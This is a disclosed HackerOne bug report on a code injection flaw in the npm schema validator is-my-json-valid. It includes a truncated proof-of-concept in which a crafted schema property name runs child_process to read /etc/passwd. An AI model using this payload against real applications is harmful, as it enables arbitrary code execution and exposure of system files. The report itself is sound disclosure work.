# [M] Arbitrary code execution via untrusted schemas in is-my-json-valid

## Summary
Severity: Medium
Program: Node.js third-party modules
Weakness: Code Injection
Reporter: chalker
State: resolved
Disclosed: 2020-07-31T17:14:47.733Z
Source: https://hackerone.com/reports/894308

## Details
I would like to report an arbitrary code execution vulnerability in `is-my-json-valid`.
It allows to execute arbitrary code if an attacker-controlled schema is passed to `is-my-json-valid`.

The module Readme doesn't say anything about the risks of untrusted schemas, so I by default assume that this is applicable.
If it's not applicable, please place a warning in the readme that users should never use untrusted schemas.

# Module

**module name:** is-my-json-valod
**version:** 2.20.0
**npm page:** `https://www.npmjs.com/package/is-my-json-valid`

## Module Description

> A JSONSchema validator that uses code generation to be extremely fast.

## Module Stats

1 517 862 weekly downloads

# Vulnerability

## Vulnerability Description

See steps to reproduce.

The problem is in `formatName` function.

## Steps To Reproduce:

```js
const validator = require('is-my-json-valid')
const schema = {
  type: 'object',
  properties: {
    'x[console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`))]': {
      required: true,
      type:'string'
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/894308_
